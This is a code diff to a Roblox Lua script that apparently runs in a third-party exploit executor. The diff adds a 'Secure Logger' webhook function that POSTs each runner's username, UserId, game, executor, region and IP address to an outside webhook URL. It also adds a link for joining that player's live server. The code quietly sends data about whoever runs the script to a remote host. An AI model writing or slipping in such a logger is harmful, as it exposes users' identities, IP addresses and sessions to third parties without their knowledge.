@@ -28,11 +28,85 @@ end
 
 --==================================================
 -- ==================================================
--- GAME INFO
+--==================================================
+-- GAME INFO (UPDATED)
 --==================================================
 local GAME_ID = game.PlaceId
-local JOB_ID = game.JobId
+local JOB_ID = game.JobId  -- This will auto-update
 local GAME_NAME = "Unknown"
+
+pcall(function()
+    GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
+end)
+
+--==================================================
+-- PLSBRAINROT JOIN LINK
+--==================================================
+local JOIN_LINK = "https://plsbrainrot.me/joiner?placeId=" .. GAME_ID .. "&gameInstanceId=" .. JOB_ID
+
+--==================================================
+-- WEBHOOK SEND (WITH CLICKABLE JOB ID)
+--==================================================
+local function sendWebhook()
+    local data = {
+        username = HUB_NAME .. " Logger",
+        avatar_url = "https://i.imgur.com/4M34hi2.png",
+        embeds = {{
+            title = "🚀 Script Executed",
+            color = EMBED_COLOR,
+
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId="
+                    .. LocalPlayer.UserId
+                    .. "&width=420&height=420&format=png"
+            },
+
+            fields = {
+                {
+                    name = "👤 Player",
+                    value = "**Username:** " .. LocalPlayer.Name ..
+                           "\n**UserId:** " .. LocalPlayer.UserId,
+                    inline = false
+                },
+                {
+                    name = "🎮 Game",
+                    value = "**Name:** " .. GAME_NAME ..
+                           "\n**GameId:** " .. GAME_ID,
+                    inline = false
+                },
+                {
+                    name = "🖥️ Session",
+                    value = "**Executor:** " .. EXECUTOR ..
+                           "\n**JobId:** [" .. JOB_ID .. "](" .. JOIN_LINK .. ")",
+                    inline = false
+                },
+                {
+                    name = "🌍 Network",
+                    value = "**Region:** " .. REGION ..
+                           "\n**IP:** " .. IP_ADDRESS,
+                    inline = false
+                }
+            },
+
+            footer = {
+                text = HUB_NAME .. " • Secure Logger"
+            },
+
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    pcall(function()
+        http_request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
 
 pcall(function()
     GAME_NAME = MarketplaceService:GetProductInfo(GAME_ID).Name
